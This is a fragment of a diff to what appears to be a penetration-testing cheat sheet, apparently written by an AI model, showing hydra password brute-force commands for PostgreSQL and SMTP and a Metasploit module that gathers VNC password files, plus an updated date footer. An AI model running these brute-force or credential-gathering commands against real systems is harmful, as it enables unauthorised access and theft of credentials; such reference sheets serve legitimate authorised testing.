 | PostgreSQL | `hydra -L users.txt -P pass.txt postgres://<ip>` |
 | SMTP | `hydra -L users.txt -P pass.txt smtp://<ip>` |
@@ -1072,5 +1200,5 @@ use post/multi/gather/vnc_password_file
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-09-01*
-*Model: claude-opus-4-8*
+*Updated: 2026-10-08*
+*Model: claude-opus-5-5*
